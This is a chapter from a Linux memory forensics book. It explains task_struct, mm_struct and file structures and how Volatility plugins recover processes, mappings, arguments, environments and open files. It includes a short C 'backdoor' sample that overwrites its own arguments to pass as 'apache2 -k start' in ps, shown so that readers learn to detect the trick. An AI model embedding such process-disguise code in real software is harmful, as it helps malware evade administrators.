# Chapter 21  
 Processes and Process Memory

A critical component of memory forensics of any system involves enumerating running processes, and exploring their interactions with the file system, memory, and network. Thus, this chapter focuses on the Linux kernel’s process structures and how they associate a process with its resources. The chapter also discusses how you can combine these resources with memory resident bash history to provide deep insight into the actions performed on the system. Additionally, the plugins highlighted in this chapter will provide the critical foundation for building the advanced capabilities discussed in later chapters.

## Processes in Memory

Every Linux process is represented by a `task_struct` structure in kernel memory. This structure holds all the information necessary to link a process with its opened file descriptors, memory maps, authentication credentials, and more. Instances of the structures are allocated from the kernel memory cache (`kmem_cache`) and stored within a cache named `task_struct_cachep`, which is also the name of a global variable in the Linux kernel that you can use to find the cache on systems that use the `SLAB` allocator (more information on this is coming up).

---

**NOTE**

The memory sample used in this chapter is from a 64-bit, 3.2 kernel installed on Debian Wheezy. This same memory sample is also used in the following chapters.

---

---

## **Analysis Objectives**

Your objectives are these:

- **Identify processes and their children**: Deep analysis of system activity necessitates finding all running processes and associating them with their parent and child processes. A bash shell isn’t suspicious *per se*, but it may become suspicious when you find out it was started by a browser process.
- **Distinguish processes from kernel threads**: Kernel threads are represented with the same data structure as processes. You must learn how to distinguish the two because malware often disguises itself as a kernel thread.
- **Associate processes to users and groups**: A full understanding of the extent of a breach or malware infection requires determining the level of privilege gained.

## **Data Structures**

The following output shows select members of the `task_struct` structure:

```
>>> dt("task_struct")
'task_struct' (1776 bytes)
0x0   : state                          ['long']
0x8   : stack                          ['pointer', ['void']]
0x10  : usage                          ['__unnamed_0x38e']
0x14  : flags                          ['unsigned int']
0x18  : ptrace                         ['unsigned int']
0x20  : wake_entry                     ['llist_node']
[snip]
0x170 : tasks                          ['list_head']
0x180 : pushable_tasks                 ['plist_node']
0x1a8 : mm                             ['pointer', ['mm_struct']]
0x1b0 : active_mm                      ['pointer', ['mm_struct']]
[snip]
0x1e4 : pid                            ['int']
0x1e8 : tgid                           ['int']
0x1f0 : stack_canary                   ['unsigned long']
0x1f8 : real_parent                    ['pointer', ['task_struct']]
0x200 : parent                         ['pointer', ['task_struct']]
0x208 : children                       ['list_head']
0x218 : sibling                        ['list_head']
0x228 : group_leader                   ['pointer', ['task_struct']]
[snip]
0x350 : cpu_timers                     ['array', 3, ['list_head']]
0x380 : real_cred                      ['pointer', ['cred']]
0x388 : cred                           ['pointer', ['cred']]
0x390 : replacement_session_keyring    ['pointer', ['cred']]
0x398 : comm                           ['String', {'length': 16}]
[snip]
```

## **Key Points**

The key points are as follows:

- `tasks`: The process’ reference into the linked list of active processes.
- `mm`: Stores memory management data. In particular, the DTB value (physical offset of the process’ directory table base) can be found at `mm->pgd`. This value is used to read from the address space of the process. It also holds references to important portions of process address space such as the stack, heap, code, and data. For kernel threads, this value is NULL.
- `pid`: The process ID.
- `parent`: A reference to the process that spawned the current one. If a process’ parent exits, the child is inherited by `init`.
- `children`: Holds the list of processes spawned by the current one.
- `cred`: Stores the credential information for the process. On some kernel versions, it includes the user ID (UID) and group ID (GID), whereas on others the user and group values are direct members of `task_struct`.
- `comm`: The name of the process is a 16-byte character array that stores the name of the executable or kernel thread. For a kernel thread, if its name ends with a forward slash followed by a number, the number indicates the CPU where the thread is executed.
- `start_time`: The time the process was created.

---

## Enumerating Processes

As previously mentioned, `task_struct` structures are stored in the `kmem_cache`. However, the target system may use different back-end allocators (`SLAB` or `SLUB`), depending on the `CONFIG_SLAB` and `CONFIG_SLUB` kernel configuration options. These memory managers serve the same purpose as pool allocations on Windows (see Chapter 5) and the `SLAB` allocator of Mac OS X: to allocate and deallocate structures of the same size in an efficient manner from a much larger, preallocated block of kernel memory.

The allocator the operating system uses impacts how you find process structures in memory. The older implementation (`SLAB`) tracks allocations of all objects of a particular type; however, it has been phased out for Intel–based Linux installs. That means you will frequently encounter systems using `SLUB` in the future. Unlike `SLAB`, however, `SLUB` does not track allocations, which makes it unreliable for enumerating objects.

---

**NOTE**

Despite being disabled on Intel–based Linux installs, the `SLAB` allocator is still widely used on Android. If you are interested in the forensics usefulness of the `kmem_cache`, we suggest reading the following paper: [http://dfir.org/research/DFRWS-2010-kmem_cache.pdf](http://dfir.org/research/DFRWS-2010-kmem_cache.pdf).

---

Aside from the kernel caches, there are two main sources for extracting process information in memory: the active process list and the PID hash table.

### Active Process List

The kernel uses this list to maintain a set of active processes. Contrary to popular belief, this list is not actually exported to userland. Thus, most live response and system administration tools do not reference it to enumerate processes. Many rootkits in the past have manipulated this data structure, however, because early Linux memory forensics tools relied on the list to enumerate active processes. This led to a discrepancy because processes would be hiding from memory forensics, but not the active system.

The `linux_pslist` plugin enumerates processes by walking the active process list pointed to by the global `init_task` variable. The `init_task` variable is statically allocated within the kernel, initialized at boot, has a PID of 0, and has a name of `swapper`. Due to a developer design choice, it does not appear in process lists generated through the `ps` command or `/proc`.

If you study the output of `linux_pslist`, you will see a number of columns populated with information about each process:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_pslist
Volatility Foundation Volatility Framework 2.4
Offset             Name         Pid   Uid  Gid DTB        Start Time
------------------ ------------ ---   ---  --- ----       ----------
0xffff88003e253510 init         1     0    0   0x37088000 2013-10-31 07:08:24
0xffff88003e252e20 kthreadd     2     0    0   ---------- 2013-10-31 07:08:24 
0xffff88003e252730 ksoftirqd/0  3     0    0   ---------- 2013-10-31 07:08:24 
0xffff88003e283550 kworker/u:0  5     0    0   ---------- 2013-10-31 07:08:24 
[snip]
0xffff88003b3d71e0 apache2      2142  33   33  0x3ce3f000 2013-10-31 07:08:44 
0xffff88003b0d3060 apache2      2144  33   33  0x3ce05000 2013-10-31 07:08:44 
0xffff88003b3d6af0 atd          2238   0   0   0x3b048000 2013-10-31 07:08:44 
0xffff88003cfb3750 daemon       2276   0   0   0x36f9e000 2013-10-31 07:08:45 
[snip]
```

As shown in the example, kernel threads do not have a DTB because they use the kernel’s address space. That is why their DTB value is denoted as “---” in the plugin output.

#### Linking Processes to Users

Also, you can cross-reference the UIDs and GIDs with the contents from `/etc/passwd` and `/etc/group`, respectively, to determine the associated user and group names. For example, the `apache2` user has UID 33 (`www-data`) and GID 33 (`www-data`), as shown here:

```
$ grep 33 /etc/{passwd,group}
/etc/passwd:www-data:x:33:33:www-data:/var/www:/bin/sh
/etc/group:www-data:x:33:
```

#### Parent and Child Relationships

Volatility also provides the `linux_pstree` plugin to help visualize the parent/child relationships. Children are indented to the right:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_pstree
Volatility Foundation Volatility Framework 2.4
Name                 Pid             Uid
init                 1               0
.udevd               348             0
..udevd              466             0
..udevd              467             0
<snip>
.sshd                2358            0
..sshd               2745            0
...bash              2747            0
....insmod           8643            0
.postgres            2381            104
..postgres           2384            104
..postgres           2385            104
..postgres           2386            104
..postgres           2387            104
[kthreadd]           2               0
.[ksoftirqd/0]       3               0
.[kworker/u:0]       5               0
.[migration/0]       6               0
.[watchdog/0]        7               0
.[migration/1]       8               0
.[ksoftirqd/1]       10              0
.[watchdog/1]        12              0
```

There are several items of interest to notice in this output. First, `init`, PID 1, is the root of the process tree except for the kernel threads. This will always be true on a clean Linux system. You can also see that all the children of `kthreadd`, the kernel thread daemon, are kernel threads. Again, this should be the case on a clean system. As you will see later, many rootkits attempt to hide their associated processes by enclosing their names in brackets (for example, `[process_name]`) in an attempt to blend in as a kernel thread. Naming a process with brackets is a common Linux convention to indicate that a process is really a kernel thread. This annotation is used by the `ps` command and several system-monitoring tools, such as `top`. Fortunately, `linux_pstree` makes this malicious activity easy to spot.

### PID Hash Table

The per-process directories under `/proc` are populated from the global PID hash table. Because the `ps` command, and all other active process listing tools gather processes from `/proc`, rootkits that want to hide processes from the live system must either tamper with this data structure or perform control flow redirection within the `/proc` file system or its supporting system calls. You will learn how to detect control modification on Linux systems in chapters 25 and 26.

---

**NOTE**

Parsing the PID hash table varies greatly between Linux kernel versions. If you’re interested in seeing the algorithms, consult the commented source code that is stored in the `volatility/plugins/linux/pidhashtable.py` file of the Volatility source distribution.

---

## Process Address Space

As the runtime loader maps an executable and its shared libraries, stack, heap, and other regions into the process address space, it must create data structures within the kernel to track and maintain these allocations. For each mapping, the kernel must track its starting and ending address, permissions, backing file information, and the metadata used for caching and searching. In this section, you will learn about methods to recover this information from memory and how you might find them useful during an investigation.

---

## **Analysis Objectives**

Your objectives are these:

- **Process memory classification**: Learn how to locate and extract a process’ heap, stack, or executable code from a memory dump.
- **Command-line arguments**: Determine where to look to extract the full command line used to invoke a process.
- **Environment variables**: Find out where a process’ variables are stored and how to verify if environment variables have been modified.
- **Shared library injection**: Analyzing the full paths to shared libraries and process executables helps detect some code injection attacks.

## **Data Structures**

The `mm` member of `task_struct` is of type `mm_struct` and it tracks the memory regions of a process. The following output shows several of the most important members for memory forensics. This output is from the test Debian system introduced earlier.

```
>>> dt("mm_struct")
'mm_struct' (920 bytes)
0x0   : mmap                           ['pointer', ['vm_area_struct']]
0x8   : mm_rb                          ['rb_root']
0x10  : mmap_cache                     ['pointer', ['vm_area_struct']]
[snip]
0x48  : pgd                            ['pointer', ['__unnamed_0x906']]
0x50  : mm_users                       ['__unnamed_0x38e']
0x54  : mm_count                       ['__unnamed_0x38e']
0x58  : map_count                      ['int']
[snip]
0xe8  : start_code                     ['unsigned long']
0xf0  : end_code                       ['unsigned long']
0xf8  : start_data                     ['unsigned long']
0x100 : end_data                       ['unsigned long']
0x108 : start_brk                      ['unsigned long']
0x110 : brk                            ['unsigned long']
0x118 : start_stack                    ['unsigned long']
0x120 : arg_start                      ['unsigned long']
0x128 : arg_end                        ['unsigned long']
0x130 : env_start                      ['unsigned long']
0x138 : env_end                        ['unsigned long']
[snip]
0x358 : ioctx_lock                     ['spinlock']
0x360 : ioctx_list                     ['hlist_head']
0x368 : owner                          ['pointer', ['task_struct']]
0x370 : exe_file                       ['pointer', ['file']]
0x378 : num_exe_file_vmas              ['unsigned long']
[snip]
```

## **Key Points**

The key points are these:

- `mmap` and `mm_rb`: These members store the individual process memory mappings as a linked list and red-black tree, respectively.
- `pgd`: The address of the process’ DTB. This is the member that populates the DTB column of `linux_pslist` and enables access to the process’ address space.
- `owner`: A back pointer to the `task_struct` that owns this `mm_struct`. On the kernels in which this member is enabled and the `SLAB` allocator is in use, it can serve as an alternative source of process listings because `mm_struct` structures are tracked by the cache.
- start_code and `end_code`: Pointers to the beginning and end of the process’ executable code.
- `start_data` and `end_data`: Pointers to the beginning and end of the process’ data.
- `start_brk` and `brk`: Pointers to the beginning and end of the process’ heap.
- `start_stack`: A pointer to the beginning of the process’ stack. No pointer is kept to the end of the stack because it will fluctuate on every function call.
- `arg_start` and `arg_end`: Pointers to the beginning and end of the command-line arguments.
- `env_start` and `env_end`: Pointers to the beginning and end of the process’ environment variables.

---

### Enumerating Process Mappings

Two members of the `mm_struct` hold the set of a process’ mappings. The first, `mmap`, is a linked list of `vm_area_struct` structures (one structure for each mapping). The other is `mm_rb`, which stores the same `vm_area_struct` structures, but in a red-black tree, so that the kernel can quickly find mappings during page faults or when a new memory range needs to be allocated. The tree is sorted by the starting address of each region, which enables the kernel to quickly query the region associated with an address.

---

## **Data Structures**

The `vm_area_struct` structures hold all information needed to find the region in memory, determine if it maps a file or not, calculate its page permissions, and more. Here is an example of the structure for our Debian system:

```
>>> dt("vm_area_struct")
'vm_area_struct' (176 bytes)
0x0   : vm_mm             ['pointer', ['mm_struct']]
0x8   : vm_start          ['unsigned long']
0x10  : vm_end            ['unsigned long']
0x18  : vm_next           ['pointer', ['vm_area_struct']]
0x20  : vm_prev           ['pointer', ['vm_area_struct']]
0x28  : vm_page_prot      ['pgprot']
0x30  : vm_flags          ['LinuxPermissionFlags', 
                           {'bitmap': {'x': 2, 'r': 0, 'w': 1}}]
0x38  : vm_rb             ['rb_node']
0x50  : shared            ['__unnamed_0xa071']
0x70  : anon_vma_chain    ['list_head']
0x80  : anon_vma          ['pointer', ['anon_vma']]
0x88  : vm_ops            ['pointer', ['vm_operations_struct']]
0x90  : vm_pgoff          ['unsigned long']
0x98  : vm_file           ['pointer', ['file']]
0xa0  : vm_private_data   ['pointer', ['void']]
0xa8  : vm_policy         ['pointer', ['mempolicy']]
```

## **Key Points**

The key points are these:

- `vm_start` and `vm_end`: The starting and ending virtual address of the region within the process’ address space.
- `vm_next` and `vm_prev`: Forward and back pointers inside the list of `vm_area_struct`structures for a process.
- `vm_flags`: Indicates whether the region was mapped readable, writable, and/or executable.
- `vm_pgoff`: The offset into the file that the region maps.
- `vm_file`: A pointer to the `file` structure of the file the region maps (or NULL if it is a memory-backed region).

---

The operating system uses the list of mappings held in the `mmap` member to populate the /`proc/<pid>/maps` files on a live system. Displaying the memory mappings by reading the files can be helpful for debugging and other system administration tasks. For example, the following snippet is from the `init` process on the same Debian machine as the analyzed memory sample:

```
# cat /proc/1/maps
00400000-00409000 r-xp 00000000 08:01 1044487        
                           /sbin/init
00608000-00609000 rw-p 00008000 08:01 1044487      
                           /sbin/init
01dc1000-01dc20e000 rw-p 00000000 00:00 0                    
                          [heap]

[snip]

7c98f080b18000-7c98f080b1a000 r-xp 00000000 08:01 130572  
                           /lib/x86_64-linux-gnu/libdl-2.13.so
7c98f080b1a000-7c98f080d1a000 ---p 00002000 08:01 130572                     
                          /lib/x86_64-linux-gnu/libdl-2.13.so
7f9881726000-7f9881727000 rw-p 00020000 08:01 130582                     
                          /lib/x86_64-linux-gnu/ld-2.13.so
7f9881727000-7f9881728000 rw-p 00000000 00:00 0
7fff23e60000-7fff23e81000 rw-p 00000000 00:00 0 
                          [stack]
```

You can compare the output of that command with the results from Volatility’s `linux_proc_maps` plugin. This plugin walks the `task_struct->mm->mmap` list of each process and reports the region-specific data.

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_proc_maps -p 1
Volatility Foundation Volatility Framework 2.4
Pid Start              End                Flags  Pgoff Major Minor  Inode   Path
--  ------------------ ------------------ ------ ----- ----- ------ -----   ----
1   0x0000000000400000 0x0000000000409000 r-x    0x0     8   1      1044487 
/sbin/init
1   0x0000000000608000 0x0000000000609000 rw-    0x8000  8   1      1044487 
/sbin/init
1   0x0000000001dc1000 0x0000000001dc20e000 rw-    0x0     0   0            0  
[heap]
1   0x00007c98f080b18000 0x00007c98f080b1a000 r-x    0x0     8   1       130572 
/lib/x86_64-linux-gnu/libdl-2.13.so
1   0x00007c98f080b1a000 0x00007c98f080d1a000 ---    0x2000  8   1       130572 
/lib/x86_64-linux-gnu/libdl-2.13.so
1   0x00007c98f080d1a000 0x00007c98f080d1b000 r--    0x2000  8   1       130572 
/lib/x86_64-linux-gnu/libdl-2.13.so

[snip]

1   0x00007f9881727000 0x00007f9881728000 rw-    0x0     0   0            0
1   0x00007fff23e5f000 0x00007fff23e81000 rw-    0x0     0   0            0 
[stack]
1   0x00007fff23fdc000 0x00007fff23fdd000 r-x    0x0     0   0            0
```

While examining the output, you can see that the `init` process is mapped from /`sbin/init`, that one of the libraries it uses is `libdl`, and that Volatility can locate the memory ranges of the stack and the heap. The output also contains the starting and ending address for each region along with its page permissions, page offset, major and minor number, and inode number.

During incident response, it is often necessary to examine the mappings of a process to look for signs of code injection. For example, if a shared library is loaded out of `/tmp` or is simply not a normal library, then it is immediately suspicious. To quickly look for signs of malicious libraries within processes, you can create a whitelist of all shared libraries on a clean Linux installation. Then script Volatility to report any shared libraries that are not in the whitelist.

Process mappings are also useful for validating where a process is executing from because even userland malware has the capability to manipulate the data shown by the `ps` command. For example, the kernel reads the command-line arguments from the stack of the userland process and exports the results through the `/proc/<pid>/cmdline` file. `ps` then reads this file to gather the arguments. Later in this chapter, you will examine malware that overwrites its own arguments to hide its full path. However, manipulating a process’ memory mappings is more difficult, because the `vm_area_struct` structures are stored within kernel memory.

### Recovering Sections of Memory

During analysis, you will often want to extract the memory mappings of a process. To assist with this effort, Volatility provides the `linux_dump_maps` plugin. You can either dump mappings from all processes, or specify one or more PIDs with the `–p` flag. You can also use the `-s ADDR` option to extract only regions that start at the specified address. You must specify the `-D` option to tell Volatility in which directory to write extracted files.

In the following example, `linux_dump_maps` is used to extract the executable section of the `init` binary from the memory dump:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_dump_map 
      -p 1 -s 0x400000 -D dump
Volatility Foundation Volatility Framework 2.4
Task      VM Start           VM End             Length Path
-------- ------------------ ------------------ ------- ----
       1 0x0000000000400000 0x0000000000409000 0x9000 dump/task.1.0x400000.vma

$ file dump/task.1.0x400000.vma
dump/task.1.0x400000.vma: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
    dynamically linked (uses shared libs), stripped
```

In this example, the `–p 1` option filters the plugin to process 1. The `–s 0x400000` option tells the plugin to dump only the one range that starts at `0x400000` (which was obtained from the `linux_proc_maps` output). After extracting the segment, you can run the `file` command and see that you have recovered part of a 64-bit ELF executable.

### Analyzing Command-line Arguments

As previously demonstrated, the `linux_pslist` plugin gathers the name of the running process from the `comm` member of `task_struct`. Unfortunately, this buffer is limited to 16 bytes, which truncates long program names, and does not give any indication about which directory the application is running from or which options were passed to the program on startup.

To recover this additional information, you can use the `linux_psaux` plugin. The plugin gathers arguments by first switching to the process’ address space through the use of the `task_struct.get_process_address_space()` function and then reading from the address pointed to by `mm_struct->arg_start` (the start of the command-line arguments on the process’ stack).

The following shows the output from this plugin on the Debian memory sample:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_psaux
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
1      0      0      init [2]
2      0      0      [kthreadd]
3      0      0      [ksoftirqd/0]
5      0      0      [kworker/u:0]
6      0      0      [migration/0]
7      0      0      [watchdog/0]
[snip]
1851   0      0      dhclient -v -pf /run/dhclient.eth0.pid \ 
                    -lf /var/lib/dhcp/dhclient.eth0.leases eth0
2061   0      0      /usr/sbin/rsyslogd -c5
2094   0      0      [flush-8:0]
2101   0      0      /usr/sbin/acpid
2137   0      0      /usr/sbin/apache2 -k start
2140   33     33     /usr/sbin/apache2 -k start
2381   104    107    /usr/lib/postgresql/9.1/bin/postgres \
                      -D /var/lib/postgresql/9.1/main \
                      -c config_file=/etc/postgresql/9.1/main/postgresql.conf
2384   104    107    postgres: writer process
2385   104    107    postgres: wal writer process
2386   104    107    postgres: autovacuum launcher process
8643   0      0      insmod ./lime-3.2.0-4-amd64.ko format=lime path=debian.lime
```

In the output, you can see that several processes have important configuration options, such as the `postgres` configuration file and working directory, and the arguments given to `LiME` to acquire the memory sample that is being analyzed. Malicious processes often read configuration parameters from the command line also, and in those instances you can use `linux_psaux` to recover information about the specific infection. The following shows output from a case we analyzed involving a userland, network-capable backdoor:

```
$ python vol.py --profile=LinuxSuse-2_6_26x64 -f infected.lime 
    linux_psaux -p 27394
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
27394  0      0      /usr/share/.apt-cache --port=8080 -k 0x34 --silent
```

This particular malware sample used several configuration options to control its runtime behavior. In this case, it was communicating on network port 8080, a common HTTP proxy port, and using a static XOR key of 0x34. Using this information, we could locate network traffic related to the malware and decode its traffic.

### Manipulating Command-line Arguments

As previously mentioned, malware encountered in the wild has manipulated the output of the `ps` command by overwriting command-line arguments. To illustrate how the attack works, first take a look at the part of the kernel source code that is responsible for reading arguments. Specifically, you will find it in the `fs/proc/base.c` file, and it starts with the declaration of the per-process `/proc/<pid>/cmdline` file.

```
static const struct pid_entry tgid_base_stuff[] = {
  <snip>
  INF("cmdline",    S_IRUGO, proc_pid_cmdline),
  <snip>
}
```

This code uses the `INF` macro to create the `cmdline` file and set it as readable by all processes. It also registers the `proc_pid_cmdline` function as the callback for when the file is read. The following shows an abbreviated version of `proc_pid_cmdline` with the parts relevant to acquiring the arguments shown:

```
static int proc_pid_cmdline(struct task_struct *task, char * buffer) {
    <snip>
    len = mm->arg_end - mm->arg_start;
    <snip>  
    res = access_process_vm(task, mm->arg_start, buffer, len, 0);
}
```

In the function, `task` is the target process, and `buffer` is a pointer to the destination buffer. The size of the arguments is calculated by subtracting the pointer to the end of the arguments from the pointer to the start of the arguments. The data is then read using the `access_process_vm` function, which safely reads memory from a process’ address space.

The following example code creates a process named `backdoor` with a single command-line argument that appears as `apache2 -k start` in `ps` output:

```
#include <stdio.h>
int main(int argc, char *argv[])
{
    char *my_args = "apache2\x00-k\x00start\x00";
    memcpy(argv[0], my_args, 17);
    while(1)
        sleep(1000);
}
```

This code operates by declaring a static command line of `apache2`, `-k`, and `start` separated by NULL (`\x00`) bytes. The original program name and arguments are then overwritten. This has the effect of hiding the malware name from `ps`:

```
$ /tmp/backdoor arg1 &
[1] 24896
$ cat /proc/24896/cmdline | xxd
0000000: 6170 6163 6865 3200 2d6b 0073 7461 7274  apache2.-k.start
0000010: 00                                       .
$ ps aux | grep 24896
vol     24896  0.0  0.0   3932   316 pts/2    S    10:00   0:00 apache2 -k start
```

This output shows `/tmp/backdoor` being executed with a PID of 24896, and `ps` reporting its name to be `apache2 -k start`.

You will now see how this malware technique changes the data seen during memory analysis. First, the command-line arguments are examined with `linux_psaux`:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime
       linux_psaux -p 24896
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
24896  1005   1005   apache2 -k start
```

As you saw on the live system, the arguments are overwritten in userland. Because `linux_psaux` uses these same data structures to retrieve arguments, you have to compare its output with `linux_proc_maps` to find proof of the manipulation:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime
     linux_pslist -p 24896
Volatility Foundation Volatility Framework 2.4
Offset             Name      Pid    Uid  Gid  DTB        Start Time
------------------ --------- -----  ---- ---  ---------- -------------------
0xffff880036e3d550 backdoor  24896  1005 1005 0x3d50e000 2013-11-20 16:00:40 

$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime
    linux_proc_maps -p 24896
Volatility Foundation Volatility Framework 2.4
Pid      Start    End      Flags Pgoff Major  Minor Inode   File Path
-------- -------  -------- ----- ----- -----  ----- ------  ----------------
   24896 0x400000 0x401000 r-x   0x0   8      1     1059161 /tmp/backdoor
   24896 0x600000 0x601000 rw-   0x0   8      1     1059161 /tmp/backdoor
<snip>
```

In the output of these plugins, you can see that `linux_pslist` reports `backdoor` as the process name and that the full path to the backdoor is `/tmp/backdoor`. Checking for discrepancies between `linux_pslist` and `linux_psaux` output can be trivially automated using Volatility.

---

**NOTE**

Chapter 27 describes how the Phalanx 2 rootkit overwrites process names to hide from system administrators and live forensics analysis.

---

## Process Environment Variables

A process’ initial set of environment variables is passed as the third parameter to the program’s `main` function. These variables are stored in a statically allocated buffer of null-terminated strings. Even if the process doesn’t reference the variables at runtime, the kernel still tracks their addresses. Thus, you can use the `linux_psenv` plugin to find and print the values of the variables. This plugin operates the same way as `linux_psaux`, except that it leverages the `mm_struct->env_start` and `mm_struct->env_end` members to locate the information. Here is an example:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_psenv
Volatility Foundation Volatility Framework 2.4
Name              Pid    Environment
init              1      HOME=/ init=/sbin/init TERM=linux 
         BOOT_IMAGE=/boot/vmlinuz-3.2.0-4-amd64 
         PATH=/sbin:/usr/sbin:/bin:/usr/bin PWD=/ rootmnt=/root
kthreadd          2
[snip]
watchdog/0        7
migration/1       8
ksoftirqd/1       10
[snip]
sshd              2358   CONSOLE=/dev/console HOME=/ 
         init=/sbin/init runlevel=2 INIT_VERSION=sysvinit-2.88 
         TERM=linux COLUMNS=80 BOOT_IMAGE=/boot/vmlinuz-3.2.0-4-amd64 
         PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/sbin:/sbin 
         RUNLEVEL=2 PREVLEVEL=N SHELL=/bin/sh PWD=/ 
         previous=N LINES=25 rootmnt=/root
postgres          2381   PG_GRANDPARENT_PID=2344 PGLOCALEDIR=/usr/share/locale 
         PGSYSCONFDIR=/etc/postgresql-common PWD=/var/lib/postgresql 
         PGDATA=/var/lib/postgresql/9.1/main
bash              2747   USER=root LOGNAME=root HOME=/root 
         PATH=/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 
         MAIL=/var/mail/root SHELL=/bin/bash SSH_CLIENT=192.168.174.1 54944 22 
         SSH_CONNECTION=192.168.174.1 54944 192.168.174.169 22 
         SSH_TTY=/dev/pts/0 TERM=xterm LANG=en_US.UTF-8
[snip]
insmod            8643   TERM=xterm SHELL=/bin/bash 
         SSH_CLIENT=192.168.174.1 54944 22 
         SSH_TTY=/dev/pts/0 USER=root MAIL=/var/mail/root 
         PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
         PWD=/root/lime LANG=en_US.UTF-8 SHLVL=1 HOME=/root LOGNAME=root 
         SSH_CONNECTION=192.168.174.1 54944 192.168.174.169 22 
         _=/sbin/insmod OLDPWD=/root
```

This output shows several items of interest:

- **Kernel threads don’t have environment variables**: As previously mentioned, some malware will attempt to blend their processes in with kernel threads. You can check for this behavior by looking at the presence (or absence) of environment variables. If variables exist, it isn’t a real kernel thread.
- **Working directories**: There are several variables pointing to the working directory of the daemons inside the `sshd` and `postgres` processes. `OLDPWD` is the directory that the user was in before changing to the current directory.
- **SSH connections**: You can determine that the `bash` and `insmod` processes were spawned over SSH because the `SSH_CONNECTION` environment variable is set with the IP address and port of the connecting user.
- **User logins**: The environment variable `USER` shows that the user `root` is the one logged in over SSH.
- **Full command paths**: The `_` variable (an underscore) tells you the full path of the command that was executed.

---

**NOTE**

As previously stated, the initial set of variables is stored within a statically allocated buffer whose size cannot change and therefore cannot handle the addition or removal of variables at runtime. Thus, variables explicitly set by calling `setenv` are stored in an alternate location. Specifically, `bash` maintains a *dynamic* data structure that contains an application’s environment and that *can* satisfy runtime modifications. You’ll access these dynamic variables in the “Bash Command Hash Table” section later in this chapter.

---

## Open File Handles

The Linux operating system follows the philosophy of “everything is a file” (see [http://ph7spot.com/musings/in-unix-everything-is-a-file](http://ph7spot.com/musings/in-unix-everything-is-a-file)). Thus, handles to files, pipes, sockets, IPC records, and more are simply treated as files and referenced by a file descriptor (integer) within applications. Recovery of these file handles provides a wealth of forensically useful information.

---

## **Analysis Objectives**

Your objectives are these:

- **Determine opened file handles:** Processes interact with the running system by opening file descriptors to files, sockets, pipes, and more. Enumerating this information can help you determine what a process was reading, writing, or communicating with at the time of the memory dump.
- **Understand common file descriptors:** The use of file descriptors (especially `stdin`, `stderr`, and `stdout`) varies greatly between client and server processes. You will learn how to spot these values and determine whether a process’ input and output are being redirected over network sockets.
- **Detect key loggers**: After malware steals keystrokes, it must log them somewhere (unless it sends them immediately over the network). The most common locations are in memory and on disk. If the latter is chosen, you can potentially identify the log file by looking at a process’ open handles.

## **Data Structures**

The following output shows the members of the `file` structure:

```
>>> dt("file")
'file' (208 bytes)
0x0   : f_u                            ['__unnamed_0x8bc2']
0x10  : f_path                         ['path']
0x20  : f_op                           ['pointer', ['file_operations']]
0x28  : f_lock                         ['spinlock']
0x2c  : f_sb_list_cpu                  ['int']
0x30  : f_count                        ['__unnamed_0x3b0']
0x38  : f_flags                        ['unsigned int']
0x3c  : f_mode                         ['unsigned int']
0x40  : f_pos                          ['long long']
0x48  : f_owner                        ['fown_struct']
0x68  : f_cred                         ['pointer', ['cred']]
0x70  : f_ra                           ['file_ra_state']
0x90  : f_version                      ['unsigned long long']
0x98  : f_security                     ['pointer', ['void']]
0xa0  : private_data                   ['pointer', ['void']]
0xa8  : f_ep_links                     ['list_head']
0xb8  : f_tfile_llink                  ['list_head']
0xc8  : f_mapping                      ['pointer', ['address_space']]
```

## **Key Points**

The key points are these:

- `f_path`: Holds a reference to the information needed to reconstruct the name and path of the file.
- `f_mode`: Tells you whether the file was opened for read, write, and/or execute access.
- `f_pos`: The position where the next read or write will occur.
- `f_mapping`: A reference to the `address_space` structure of the file that stores pointers into the page cache. The page cache holds the file’s contents on disk.
- `f_op`: This member identifies a set of file operation pointers for the file descriptor. These operations (functions) are called when a process reads, writes, and seeks, and so on. Later in the book, you will learn how rootkits hook these operations to hide files on live machines.

---

A process’ file descriptors are stored within kernel memory. Each process has a dedicated table with an array of indexes, in which each index is the file descriptor number, and the corresponding value is a pointer to the `file` structure instance. A NULL pointer means that the file descriptor is not in use. To find a process’ file descriptor table, you can examine the `files` member of `task_struct`, which is of type `files_struct`.

The `linux_lsof` plugin walks a process’ file descriptor table and prints the file descriptor number and path for each entry. Here is an example that shows the opened file handles for the `insmod` process that was used to load `LiME`.

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_lsof -p 8643
Volatility Foundation Volatility Framework 2.4
Pid      FD       Path
-------- -------- ----
    8643        0 /dev/pts/0
    8643        1 /dev/pts/0
    8643        2 /dev/pts/0
    8643        3 /root/lime/lime-3.2.0-4-amd64.ko
```

In this output, you see that file descriptors 0 (`stdin`), 1 (`stdout`), and 2 (`stderr`) are set to the pseudo terminal of the user and that file descriptor 3 is the kernel module being loaded. The next command analyzes opened file handles of an SSH client:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_lsof -p 2745
Volatility Foundation Volatility Framework 2.4
Pid      FD       Path
-------- -------- ----
    2745        0 /dev/null
    2745        1 /dev/null
    2745        2 /dev/null
    2745        3 socket:[7471]
    2745        4 socket:[6607]
    2745        5 pipe:[6608]
    2745        6 pipe:[6608]
    2745        7 /dev/ptmx
    2745        9 /dev/ptmx
    2745       10 /dev/ptmx
```

The Secure Shell (SSH) client process’ `stdin`, `stdout`, and `stderr` file descriptors are all set to `/dev/null` (which is expected of network applications). Additionally, there are two socket file descriptors with inode numbers 7471 and 6607. By analyzing the process’ network connections with `linux_netstat` you’ll notice an active connection and non-named UNIX socket.

```
